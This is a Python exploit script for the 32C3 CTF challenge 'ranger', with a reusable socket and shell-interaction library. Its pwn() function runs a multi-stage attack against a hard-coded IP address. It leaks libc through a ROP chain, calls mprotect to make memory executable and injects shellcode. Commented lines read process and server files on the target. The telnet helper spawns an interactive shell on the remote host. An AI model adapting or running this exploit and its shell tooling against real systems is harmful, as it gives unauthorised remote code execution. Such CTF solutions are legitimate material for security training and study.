#!/usr/bin/env python3
#
# 32C3 CTF 'ranger' exploit
#
# Author: Samuel <saelo> Groß
#

import socket
import termios
import tty
import time
import sys
import select
import os
import re
import telnetlib
import string
from struct import pack, unpack
from binascii import hexlify, unhexlify

from base64 import b64encode, b64decode

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#           Global Config
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TARGET = ('136.243.194.52', 1024)

# Enable "wireshark" mode, pretty prints all incoming and outgoing network traffic.
NETDEBUG = True

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#       Encoding and Packing
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def e(d):
    """Encode the given string instance using UTF-8."""
    return d.encode('UTF-8')

def d(d):
    """Decode the given bytes instance using UTF-8."""
    return d.decode('UTF-8')

def p8(d):
    """Return d packed as 8-bit unsigned integer (little endian)."""
    return pack('<B', d)

def u8(d):
    """Return the number represented by d when interpreted as a 8-bit unsigned integer (little endian)."""
    return unpack('<B', d)[0]

def p32(d):
    """Return d packed as 32-bit unsigned integer (little endian)."""
    return pack('<I', d)

def u32(d):
    """Return the number represented by d when interpreted as a 32-bit unsigned integer (little endian)."""
    return unpack('<I', d)[0]

def p64(d):
    """Return d packed as 64-bit unsigned integer (little endian)."""
    return pack('<Q', d)

def u64(d):
    """Return the number represented by d when interpreted as a 64-bit unsigned integer (little endian)."""
    return unpack('<Q', d)[0]

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Output
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def print_good(msg):
    print(ansi(Term.BOLD) + '[+] ' + msg + ansi(Term.CLEAR))

def print_bad(msg):
    print(ansi(Term.COLOR_MAGENTA) + '[-] ' + msg + ansi(Term.CLEAR))

def print_info(msg):
    print('[*] ' + msg)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#              Misc.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def bytes_and_strings_are_cool(func):
    """Decorator to encode arguments that are string instances."""
    def inner(*args, **kwargs):
        nargs = tuple(map(lambda arg: e(arg) if isinstance(arg, str) else arg, args))
        nkwargs = dict(map(lambda k, v: (k, e(v)) if isinstance(v, str) else (k, v), kwargs))
        return func(*nargs, **nkwargs)
    return inner

def validate(data, badchars):
    """Assert that no badchar occurs in data."""
    assert(all(b not in data for b in badchars))

def is_printable(b):
    """Return true if the given byte is a printable ASCII character."""
    return b in e(string.printable)

def hexdump(data):
    """Return a hexdump of the given data. Similar to what `hexdump -C` produces."""

    def is_hexdump_printable(b):
        return b in b' 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[]{}\\|\'";:/?.,<>'

    lines = []
    chunks = (data[i*16:i*16+16] for i in range((len(data) + 15) // 16))

    for i, chunk in enumerate(chunks):
        hexblock = ['{:02x}'.format(b) for b in chunk]
        left, right = ' '.join(hexblock[:8]), ' '.join(hexblock[8:])
        asciiblock = ''.join(chr(b) if is_hexdump_printable(b) else '.' for b in chunk)
        lines.append('{:08x}  {:23}  {:23}  |{}|'.format(i*16, left, right, asciiblock))

    return '\n'.join(lines)

class Term:
    COLOR_BLACK = '30'
    COLOR_RED = '31'
    COLOR_GREEN = '32'
    COLOR_BROWN = '33'
    COLOR_BLUE = '34'
    COLOR_MAGENTA = '35'
    COLOR_CYAN = '36'
    COLOR_WHITE = '37'
    CLEAR = '0'

    UNDERLINE = '4'
    BOLD = '1'

    ESCAPE_START = '\033['
    ESCAPE_END = 'm'

# TODO rename to style and append Term.Clear ?
def ansi(*args):
    """Construct an ANSI terminal escape code."""
    code = Term.ESCAPE_START
    code += ';'.join(args)
    code += Term.ESCAPE_END
    return code

class DisconnectException(Exception):
    pass

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#        Pattern Generation
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Pattern:
    """De-Bruijn sequence generator."""
    alphabet = string.digits + string.ascii_letters

    def __init__(self, length):
        if length <= len(self.alphabet):
            self._seq = self.alphabet[:length]
        elif length <= len(self.alphabet) ** 2:
            self._seq = self._generate(2)[:length]
        elif length <= len(self.alphabet) ** 3:
            self._seq = self._generate(3)[:length]
        elif length <= len(self.alphabet) ** 4:
            self._seq = self._generate(4)[:length]
        else:
            raise Exception("Pattern length is way to large")

    def _generate(self, n):
        """Generate a De Bruijn sequence."""
        # See https://en.wikipedia.org/wiki/De_Bruijn_sequence

        k = len(self.alphabet)
        a = [0] * k * n
        sequence = []

        def db(t, p):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)
        db(1, 1)
        return ''.join(self.alphabet[i] for i in sequence)

    def bytes(self):
        """Return this sequence as bytes."""
        return e(self._seq)

    def __str__(self):
        """Return this sequence as string."""
        return self._seq

    @bytes_and_strings_are_cool
    def offset(self, needle):
        """Returns the index of 'needle' in this sequence.

        'needle' should be of type string or bytes. If an integer is provided
        it will be treated as 32-bit or 64-bit little endian number, depending
        on its bit length.
        """
        if isinstance(needle, int):
            if needle.bit_length() <= 32:
                needle = p32(needle)
            else:
                needle = p64(needle)
        needle = d(needle)

        idx = self._seq.index(needle)
        if self._seq[idx+len(needle):].find(needle) != -1:
            raise ValueError("Multiple occurances found!")

        return idx

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Network
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Channel:
    """Convenience wrapper around a socket."""
    OUTGOING_COLOR = Term.COLOR_RED
    INCOMING_COLOR = Term.COLOR_BLUE

    def __init__(self, sock, verbose):
        self._s = sock
        self._verbose = verbose
        self._buf = bytearray()

    def _prettyprint(self, data, outgoing):
        """Prettyprint the given data.

        This does the following: All data that is valid ASCII is colorized according to the direction of the traffic.
        Everything else is converted to hex, then printed in bold and underline for visibility.

        Only ASCII is supported as of now. This might be the better choice anyway since otherwise valid UTF-8 might be
        detected in arbitrary binary streams.
        """
        TEXT = 0
        BINARY = 1
        # Various Thresholds for the heuristics below
        X = 4
        Y = 16
        Z = 2


        color = self.OUTGOING_COLOR if outgoing else self.INCOMING_COLOR

        # Step 1: Tag every byte of the input stream with it's detected type.
        parts = []
        curr = ''
        for b in data:
            if is_printable(b):
                parts.append((TEXT, b))
            else:
                parts.append((BINARY, b))

        # Step 2: Merge neighboring bytes of the same type and convert the sequences to type bytes.
        i = 0
        mergedparts = []
        while i < len(parts):
            t = parts[i][0]
            arr = [parts[i][1]]
            j = i+1
            while j < len(parts) and parts[j][0] == t:
                arr.append(parts[j][1])
                j += 1
            i = j

            # Heuristic: If there are Y ASCII bytes with the same value followed by Z ASCII bytes followed by binary data, treat the Z bytes as binary as well.
            extra = []
            if t == TEXT and len(arr) > Y and i < len(parts) - 1:
                mid = len(arr) - Z - 1
                start, end = mid, mid
                char = arr[mid]
                while start >= 0 and arr[start] == char:
                    start -= 1
                while end < len(arr) and arr[end] == char:
                    end += 1

                # start and end point outside the range of equal-valued characters now.
                if end - start >= Y+2 and end < len(parts):
                    extra = arr[end:]
                    arr = arr[:end]

            mergedparts.append((t, bytes(arr)))
            if extra:
                mergedparts.append((BINARY, bytes(extra)))

        parts = mergedparts

        # Step 3: Merge all parts and prepend the ansi terminal escape sequences for the given type.
        buf = ''
        last = None
        for tag, value in parts:
            # Heuristic: If there is an ASCII sequence of X bytes or less surrounded by binary data, treat those as binary as well.
            if tag == TEXT and len(value) <= X and last == BINARY:
                tag = BINARY

            if tag == TEXT:
                buf += ansi(Term.CLEAR) + ansi(color)
            else:
                buf += ansi(color, Term.BOLD, Term.UNDERLINE)
                value = hexlify(value)

            buf += d(value)
            last = tag

        buf += ansi(Term.CLEAR)

        # Step 4: Print :)
        print(buf, end='')
        sys.stdout.flush()

    def setVerbose(self, verbose):
        """Set verbosity of this channel."""
        self._verbose = verbose

    def recv(self, n=4096):
        """Return up to n bytes of data from the remote end.

        Buffers incoming data internally.

        NOTE: You probably shouldn't be using this method. Use one of the other recvX methods instead.
        """
        if len(self._buf) < n:
            buf = self._s.recv(65536)
            if not buf and not self._buf:
                raise DisconnectException("Server disconnected.")
            if self._verbose:
                self._prettyprint(buf, False)
            self._buf += buf

        # This code also works if n > len(self._buf)
        buf = self._buf[:n]
        self._buf = self._buf[n:]
        return buf

    def recvn(self, n):
        """Return exactly n bytes of data from the remote end."""
        data = []
        while len(data) != n:
            data.append(self.recv(1))

        return b''.join(data)

    @bytes_and_strings_are_cool
    def recvtil(self, delim):
        """Read data from the remote end until delim is found in the data.

        The first occurance of delim is included in the returned buffer.
        """
        buf = b''
        # TODO maybe not make this O(n**2)...
        while not delim in buf:
            buf += self.recv(1)
        return buf

    def recvregex(self, regex):
        """Receive incoming data until it matches the given regex.

        Returns the match object.

        IMPORTANT: Since the data is coming from the network, it's usually
        a bad idea to use a regex such as 'addr: 0x([0-9a-f]+)' as this function
        will return as soon as 'addr: 0xf' is read. Instead, make sure to
        end the regex with a known sequence, e.g. use 'addr: 0x([0-9a-f]+)\\n'.
        """
        if isinstance(regex, str):
            regex = re.compile(regex)
        buf = ''
        match = None

        while not match:
            buf += d(self.recv(1))
            match = regex.search(buf)

        return match

    def recvline(self):
        """Receive and return a line from the remote end.

        The trailing newline character will be included in the returned buffer.
        """
        return recvtil('\n')

    def send(self, buf):
        """Send all data in buf to the remote end."""
        if self._verbose:
            self._prettyprint(buf, True)
        self._s.sendall(buf)

    def sendnum(self, n):
        """Send the string representation of n followed by a newline character."""
        sendline(n)

    @bytes_and_strings_are_cool
    def sendline(self, l):
        """Prepend a newline to l and send everything to the remote end."""
        self.send(l + b'\n')

    def interact(self):
        """Interact with the remote end: connect stdout and stdin to the socket."""
        # TODO maybe use this at some point: https://docs.python.org/3/library/selectors.html
        self._verbose = False
        try:
            while True:
                available, _, _ = select.select([sys.stdin, self._s], [], [])
                for src in available:
                    if src == sys.stdin:
                        data = sys.stdin.buffer.read1(1024)        # Only one read() call, otherwise this breaks when the tty is in raw mode
                        self.send(data)
                    else:
                        data = self._s.recv(4096)
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except DisconnectException:
            print_info("Server disconnected.")
            return

#
# Telnet emulation
#
def telnet(shell='/bin/bash'):
    """Telnet emulation.

    Opens a PTY on the remote end and connects the master side to the socket.
    Then spawns a shell connected to the slave end and puts the controlling TTY
    on the local machine into raw mode.
    Result: Something similar to a telnet/(plaintext)ssh session.

    Vim, htop, su, less, etc. will work with this.

    !!! This function only works if the channel is connected to a shell !!!
    """
    assert(sys.stdin.isatty())
    c.setVerbose(False)

    # Open a PTY and spawn a bash connected to the slave end on the remote side
    code = 'import pty; pty.spawn([\'{}\', \'-i\'])'.format(shell)
    sendline('python -c "{}"; exit'.format(code))
    time.sleep(0.1)           # No really good way of knowing when the shell has opened on the other side...
                              # Should maybe put some more functionality into the inline python code instead.

    # Save current TTY settings
    old_settings = termios.tcgetattr(sys.stdin.fileno())

    # Put TTY into raw mode
    tty.setraw(sys.stdin)

    # Resize remote terminal
    # Nice-to-have: also handle terminal resize
    cols, rows = os.get_terminal_size(sys.stdin.fileno())
    sendline('stty rows {} cols {}; echo READY'.format(rows, cols))
    recvtil('READY\r\n')            # terminal echo
    recvtil('READY\r\n')            # command output

    interact()

    # Restore previous settings
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)

#
# Convenience wrappers that use the global socket instance
#
# def send(b):
    # c.send(b)

# def sendline(l):
    # c.sendline(l)

# def sendnum(n):
    # c.sendnum(n)

# def recv(n):
    # return c.recv(n)

# def recvtil(delim):
    # return c.recvtil(delim)

# def recvn(n):
    # return c.recvn(n)

# def recvline():
    # return c.recvline()

# def recvregex(r):
    # return c.recvregex(r)

# def interact():
    # c.interact()

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#          Global Setup
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
s = socket.create_connection(TARGET)
c1 = Channel(s, NETDEBUG)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#         Your code here
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def set_filename(c, filename):
    assert(len(filename) <= 256)
    c.send(p8(1))
    c.send(p32(len(filename)))
    c.send(filename)
    c.recvtil('\nOK\n')

def set_content(c, content):
    assert(len(content) <= 256)
    c.send(p8(2))
    c.send(p32(len(content)))
    c.send(content)
    c.recvtil('\nOK\n')

def set_key(c, key):
    assert(len(key) <= 256)
    c.send(p8(3))
    c.send(p32(len(key)))
    c.send(key)
    c.recvtil('\nOK\n')

def write_file(c):
    c.send(p8(4))
    c.send(p32(0))
    c.recvtil('\nOK\n')

def read_file(c):
    c.send(p8(5))
    c.send(p32(0))
    return c.recvtil('\nOK\n')[:-4]

def write_file_encrypted(c):
    c.send(p8(6))
    c.send(p32(0))
    c.recvtil('\nOK\n')

def read_file_encrypted(c):
    c.send(p8(7))
    c.send(p32(0))
    return c.recvtil('\nOK\n')[:-4]

def base64_encode(c):
    c.send(p8(8))
    c.send(p32(0))
    c.recvtil('\nOK\n')

def base64_decode(c):
    c.send(p8(9))
    c.send(p32(0))
    return c.recvtil('\nOK\n')[:-4]

PORT = 1234

def get_instance():
    global c1, PORT

    match = c1.recvregex('Spawning your instance on port ([0-9]+) on this server. Your IP is ([^\n]+)\n')
    PORT = int(match.group(1))
    local_ip = match.group(2)

    print_info("Instance spawned on port {}".format(PORT))

    s = socket.create_connection(('136.243.194.52', PORT))
    s.settimeout(2)
    c1 = Channel(s, NETDEBUG)

    pwn()

def pwn():
    s = socket.create_connection(('136.243.194.52', PORT))
    c2 = Channel(s, NETDEBUG)

    time.sleep(10)

    pop_rdi = 0x401c43      # pop rdi ; ret
    pop_rsi = 0x401c41      # pop rsi ; pop r15 ; ret
    pop_rsp = 0x401c3d      # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    read = 0x400B60
    write = 0x400AC0
    read_got = 0x602520
    ret_bp = 0x401BD4

    payload = 256 * b'A'
    set_content(c1, payload)
    base64_encode(c1)

    padding = b'X' * 250
    payload_raw = b'XX'         # fill previous chunk
    payload_raw += p64(pop_rdi)
    payload_raw += p64(4)
    payload_raw += p64(pop_rsi)
    new_stack = 0x00603000 - 0x400
    payload_raw += p64(new_stack)
    payload_raw += p64(0x41414141)
    payload_raw += p64(read)
    payload_raw += p64(pop_rsp)
    payload_raw += p64(new_stack)

    payload_raw += b'X' * 100
    payload = padding + b64encode(payload_raw)
    payload = payload.replace(b'=', b'A')

    filename = payload[:256]
    assert(len(filename) == 256)
    key = payload[256:]
    key = key.ljust(250, b'A') + b'\x00'
    set_filename(c2, filename)
    set_key(c2, key)

    c1.send(p8(9))
    c1.send(p32(0))

    ### Stage 2 -- could just as well be done in stage 1 though

    rop = p64(0x41414141)       # r13
    rop += p64(0x41414141)       # r14
    rop += p64(0x41414141)       # r15

    rop += p64(pop_rdi)
    rop += p64(4)
    rop += p64(pop_rsi)
    rop += p64(read_got)
    rop += p64(0x41414141)
    rop += p64(write)

    rop += p64(pop_rdi)
    rop += p64(4)
    rop += p64(pop_rsi)
    new_stack = 0x00603000 - 0x800
    rop += p64(new_stack)
    rop += p64(0x41414141)
    rop += p64(read)
    rop += p64(pop_rsp)
    rop += p64(new_stack)

    c1.send(rop)

    resp = c1.recvn(8)
    read_libc = u64(resp)
    libc_base = read_libc - 0xeb800
    libc_base = read_libc - 0xf7470

    print_good("libc @ 0x{:x}".format(libc_base))

    ### Stage 3

    mprotect = libc_base + 0x101780
    pop_rdx = libc_base + 0x1b92
    pop_rcx = libc_base + 0xea8ea      # pop rcx ; pop rbx ; ret

    code_addr = 0x602000

    rop = p64(0x400CF1)         # r13
    rop += p64(0x41414141)      # r14
    rop += p64(0x41414141)      # r15
    rop += p64(pop_rdi)
    rop += p64(code_addr)
    rop += p64(pop_rsi)
    rop += p64(0x1000)
    rop += p64(0x41414141)
    rop += p64(pop_rdx)
    rop += p64(0x7)
    rop += p64(mprotect)

    rop += p64(pop_rdi)
    rop += p64(4)
    rop += p64(pop_rsi)
    rop += p64(code_addr)
    rop += p64(0x41414141)
    rop += p64(pop_rdx)
    rop += p64(0x1000)
    rop += p64(read)

    rop += p64(code_addr)

    c1.send(rop)

    ### Stage 4

    code = open('ShellcodeBuilder/shellcode', 'rb').read()

    c1.send(code)
    #time.sleep(0.5)

    ## Use with the readloop shellcode
    # c1.send(b'/proc/self/cmdline\x00')
    # c1.recvtil('ranger')
    # c1.recvtil(b'\x00')
    # c1.recvtil(b'\x00')

    # c1.send(b'/proc/self/status\x00')
    # status = d(c1.recv(1024))
    # print(status)
    # match = re.search('PPid:\s*([0-9]+)', status)
    # print("PPID: ", match.group(1))
    # ppid = int(match.group(1))

    # c1.send(b'/proc/' + e(str(ppid)) + b'/status\x00')
    # c1.send(b'/home/challenge/server.py\x00')

    print(hexdump(c2.recv(1024)))

if __name__ == '__main__':
    get_instance()
